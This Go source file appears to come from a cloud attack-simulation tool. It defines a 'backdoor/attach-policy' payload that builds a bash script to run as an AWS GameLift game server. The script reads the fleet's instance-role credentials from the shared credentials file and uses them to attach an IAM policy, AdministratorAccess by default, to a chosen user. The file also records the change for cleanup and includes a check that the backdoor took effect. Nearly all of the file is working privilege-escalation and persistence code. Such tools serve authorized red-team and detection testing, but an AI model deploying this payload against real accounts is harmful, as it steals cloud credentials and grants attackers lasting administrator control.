// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package gamelift

import (
	"context"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a GameLift game server bash script that reads
// the fleet instance role credentials from the SHARED_CREDENTIAL_FILE and attaches
// an IAM policy to the target user. This payload is for event-triggered execution
// where the game server process runs autonomously on the fleet EC2 instance.
type BackdoorAttachPolicyPayload struct{}

func NewBackdoorAttachPolicyPayload() *BackdoorAttachPolicyPayload {
	return &BackdoorAttachPolicyPayload{}
}

func init() {
	payloads.Register(NewBackdoorAttachPolicyPayload())
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach an IAM policy to a user via a GameLift game server process that reads SHARED_CREDENTIAL_FILE instance role credentials"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGameLift,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM username to attach policy to (auto-resolved from caller identity if not set)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "ARN of the policy to attach (default: AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

// GenerateCode produces the game server bash script. The TARGET_USER and POLICY_ARN
// values are baked into the script at generation time because GameLift does not have
// an equivalent to Lambda's env var injection.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	// Validate that targetUser doesn't contain shell-unsafe characters.
	if strings.ContainsAny(targetUser, `"';\&|$`) {
		return "", fmt.Errorf("TARGET_USER contains invalid characters: %s", targetUser)
	}

	script := fmt.Sprintf(`#!/bin/bash

# GameLift game server script — Pathrunner backdoor/attach-policy payload
# Reads fleet instance role credentials from SHARED_CREDENTIAL_FILE and
# attaches an IAM policy to the target user using those privileged credentials.

CRED_FILE="/local/credentials/credentials"
TARGET_USER=%q
POLICY_ARN=%q

echo "=== GameLift Game Server Process Starting ==="
echo "Target user: ${TARGET_USER}"
echo "Policy ARN: ${POLICY_ARN}"

# Wait for GameLift to write the shared credentials file (max 10 seconds).
for i in 1 2 3 4 5; do
    if [ -f "${CRED_FILE}" ]; then
        break
    fi
    echo "Waiting for credentials file... (attempt ${i})"
    sleep 2
done

if [ ! -f "${CRED_FILE}" ]; then
    echo "ERROR: Credentials file not found at ${CRED_FILE} after waiting"
    ls -la /local/credentials/ 2>/dev/null || echo "No /local/credentials/ directory"
    # Keep running so the fleet does not terminate immediately.
    while true; do sleep 60; done
fi

echo "Reading shared credentials from ${CRED_FILE}..."

export AWS_ACCESS_KEY_ID=$(grep 'aws_access_key_id' "${CRED_FILE}" | awk -F= '{print $2}' | tr -d ' ')
export AWS_SECRET_ACCESS_KEY=$(grep 'aws_secret_access_key' "${CRED_FILE}" | awk -F= '{print $2}' | tr -d ' ')
export AWS_SESSION_TOKEN=$(grep 'aws_session_token' "${CRED_FILE}" | awk -F= '{print $2}' | tr -d ' ')
export AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region 2>/dev/null || echo "us-east-1")

if [ -z "${AWS_ACCESS_KEY_ID}" ]; then
    echo "ERROR: Could not parse credentials from ${CRED_FILE}"
    while true; do sleep 60; done
fi

echo "Credentials loaded (key: ${AWS_ACCESS_KEY_ID:0:10}...)"

echo "Verifying instance role identity..."
aws sts get-caller-identity 2>&1 || echo "WARNING: STS call failed"

echo "Attaching policy ${POLICY_ARN} to user ${TARGET_USER}..."
if aws iam attach-user-policy \
    --user-name "${TARGET_USER}" \
    --policy-arn "${POLICY_ARN}" 2>&1; then
    echo "SUCCESS: Policy attached to ${TARGET_USER}"
else
    echo "FAILED: Could not attach policy (exit code: $?)"
fi

# Keep the process alive so the fleet remains active.
echo "Game server running..."
while true; do sleep 60; done
`, targetUser, policyArn)

	return script, nil
}

func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// ReportSideEffects returns the IAM policy attachment as a tracked side effect
// so the workspace cleanup command can detach it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", targetUser, "AdministratorAccess"),
			ARN:           policyArn,
			CleanupMethod: "iam:DetachUserPolicy",
			Metadata: map[string]string{
				"principal_type": "user",
				"principal_name": targetUser,
				"policy_arn":     policyArn,
			},
		},
	}
}

// VerifySuccess checks whether the IAM policy was successfully attached to the target user.
// Uses the victim's credentials (passed as config) to call iam:ListAttachedUserPolicies.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetUser := options["TARGET_USER"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	iamClient := iam.NewFromConfig(config)
	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
		UserName: aws.String(targetUser),
	})
	if err != nil {
		return false, fmt.Errorf("failed to list attached policies for user %s: %v", targetUser, err)
	}

	for _, policy := range result.AttachedPolicies {
		if aws.ToString(policy.PolicyArn) == policyArn {
			return true, nil
		}
	}

	return false, nil
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
	}
	return nil
}
